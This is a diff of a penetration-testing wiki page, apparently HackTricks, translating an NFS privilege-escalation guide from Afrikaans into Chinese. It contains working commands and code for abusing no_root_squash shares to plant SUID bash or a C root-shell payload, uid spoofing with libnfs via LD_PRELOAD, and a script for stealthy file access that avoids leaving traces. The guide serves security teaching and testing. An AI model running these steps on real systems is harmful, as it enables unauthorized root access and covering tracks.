@@ -19,19 +19,19 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 
-Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as **no\_root\_squash**, dan kan jy dit **toegang** vanaf **as 'n kliënt** en **binne** daardie gids **skryf** **asof** jy die plaaslike **root** van die masjien was.
+阅读 _ **/etc/exports** _ 文件，如果你发现某个目录被配置为 **no\_root\_squash**，那么你可以 **作为客户端访问** 该目录，并 **像本地机器的 root 一样在该目录中写入**。
 
-**no\_root\_squash**: Hierdie opsie gee basies gesag aan die root-gebruiker op die kliënt om lêers op die NFS-bediener as root te benader. En dit kan lei tot ernstige sekuriteitsimplikasies.
+**no\_root\_squash**：此选项基本上赋予客户端的 root 用户以 root 身份访问 NFS 服务器上的文件的权限。这可能导致严重的安全隐患。
 
-**no\_all\_squash:** Dit is soortgelyk aan die **no\_root\_squash** opsie, maar dit geld vir **nie-root gebruikers**. Stel jou voor, jy het 'n shell as nobody gebruiker; het die /etc/exports lêer nagegaan; no\_all\_squash opsie is teenwoordig; kyk na die /etc/passwd lêer; emuleer 'n nie-root gebruiker; skep 'n suid lêer as daardie gebruiker (deur te monteer met nfs). Voer die suid uit as nobody gebruiker en word 'n ander gebruiker.
+**no\_all\_squash**：这与 **no\_root\_squash** 选项类似，但适用于 **非 root 用户**。想象一下，你以 nobody 用户的身份获得一个 shell；检查 /etc/exports 文件；存在 no\_all\_squash 选项；检查 /etc/passwd 文件；模拟一个非 root 用户；以该用户身份创建一个 suid 文件（通过使用 nfs 挂载）。以 nobody 用户身份执行该 suid 文件并成为不同的用户。
 
-# Privilege Escalation
+# 权限提升
 
-## Remote Exploit
+## 远程利用
 
-As jy hierdie kwesbaarheid gevind het, kan jy dit benut:
+如果你发现了这个漏洞，你可以利用它：
 
-* **Monteer daardie gids** in 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde gids die **/bin/bash** binêre en gee dit **SUID** regte, en **voerde** van die slagoffer masjien daardie bash binêre uit.
+* **在客户端机器上挂载该目录**，并 **以 root 身份将 /bin/bash 二进制文件复制** 到挂载文件夹中，并赋予其 **SUID** 权限，然后 **从受害者** 机器执行该 bash 二进制文件。
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -44,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde vouer ons saamgecompileerde payload wat die SUID-toestemming sal misbruik, gee vir dit **SUID** regte, en **voer vanaf die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
+* **在客户端机器上挂载该目录**，并**以root身份复制**我们编译好的有效载荷到挂载文件夹中，该有效载荷将滥用SUID权限，赋予其**SUID**权限，并**从受害者**机器执行该二进制文件（您可以在这里找到一些[C SUID有效载荷](payloads-to-execute.md#c)）。
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -58,40 +58,40 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-## Plaaslike Exploit
+## Local Exploit
 
 {% hint style="info" %}
-Let daarop dat as jy 'n **tunnel van jou masjien na die slagoffer masjien kan skep, jy steeds die Remote weergawe kan gebruik om hierdie privaatheidsverhoging te exploiteer deur die vereiste poorte te tunnelle**.\
-Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy in elk geval nie die **remote exploit** kan gebruik nie en jy sal hierdie truuk moet **misbruik**.\
-Nog 'n vereiste vir die exploit om te werk is dat **die eksport binne `/etc/export`** **die `insecure` vlag moet gebruik**.\
-\--_Ek is nie seker of hierdie truuk sal werk as `/etc/export` 'n IP adres aandui nie_--
+注意，如果您可以从您的机器创建一个**到受害者机器的隧道，您仍然可以使用远程版本来利用此特权提升，隧道所需的端口**。\
+以下技巧适用于文件`/etc/exports`**指示一个IP**的情况。在这种情况下，您**将无法使用**任何情况下的**远程利用**，您需要**利用这个技巧**。\
+另一个使利用有效的必要条件是**`/etc/export`中的导出****必须使用`insecure`标志**。\
+\--_我不确定如果`/etc/export`指示一个IP地址，这个技巧是否有效_--
 {% endhint %}
 
-## Basiese Inligting
+## Basic Information
 
-Die scenario behels die eksploitering van 'n gemonteerde NFS deel op 'n plaaslike masjien, wat 'n fout in die NFSv3 spesifikasie benut wat die kliënt toelaat om sy uid/gid te spesifiseer, wat moontlik ongeoorloofde toegang moontlik maak. Die eksploitering behels die gebruik van [libnfs](https://github.com/sahlberg/libnfs), 'n biblioteek wat die vervalsing van NFS RPC oproepe toelaat.
+该场景涉及利用本地机器上挂载的NFS共享，利用NFSv3规范中的一个缺陷，该缺陷允许客户端指定其uid/gid，可能导致未经授权的访问。利用涉及使用[libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造NFS RPC调用的库。
 
-### Samevoeging van die Biblioteek
+### Compiling the Library
 
-Die biblioteek samevoegingsstappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval was die fallocate syscalls uitgekommenteer. Die samevoegingsproses behels die volgende opdragte:
+库的编译步骤可能需要根据内核版本进行调整。在这种特定情况下，fallocate系统调用被注释掉。编译过程涉及以下命令：
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-### Voer die Exploit uit
+### Conducting the Exploit
 
-Die exploit behels die skep van 'n eenvoudige C-programma (`pwn.c`) wat voorregte na root verhoog en dan 'n shell uitvoer. Die program word gecompileer, en die resulterende binêre (`a.out`) word op die deel geplaas met suid root, met behulp van `ld_nfs.so` om die uid in die RPC-oproepe te vervals:
+该漏洞涉及创建一个简单的 C 程序 (`pwn.c`)，该程序提升权限到 root，然后执行一个 shell。程序被编译，生成的二进制文件 (`a.out`) 被放置在具有 suid root 的共享上，使用 `ld_nfs.so` 在 RPC 调用中伪造 uid：
 
-1. **Compileer die exploit kode:**
+1. **编译漏洞代码：**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Plaas die exploit op die deel en verander sy toestemmings deur die uid te vervals:**
+2. **将漏洞放置在共享上并通过伪造 uid 修改其权限：**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -99,14 +99,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **Voer die exploit uit om root voorregte te verkry:**
+3. **执行漏洞以获得 root 权限：**
 ```bash
 /mnt/share/a.out
 #root
 ```
 
-## Bonus: NFShell vir Stealthy Lêertoegang
-Sodra root-toegang verkry is, om met die NFS-deel te kommunikeer sonder om eienaarskap te verander (om spore te vermy), word 'n Python-skrip (nfsh.py) gebruik. Hierdie skrip pas die uid aan om ooreen te stem met dié van die lêer wat toeganklik is, wat interaksie met lêers op die deel moontlik maak sonder toestemmingprobleme:
+## Bonus: NFShell for Stealthy File Access
+一旦获得 root 访问权限，为了在不更改所有权的情况下与 NFS 共享进行交互（以避免留下痕迹），使用一个 Python 脚本 (nfsh.py)。该脚本调整 uid 以匹配被访问文件的 uid，从而允许与共享上的文件进行交互而不出现权限问题：
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -125,22 +125,22 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-Hardloop soos:
+运行如下：
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
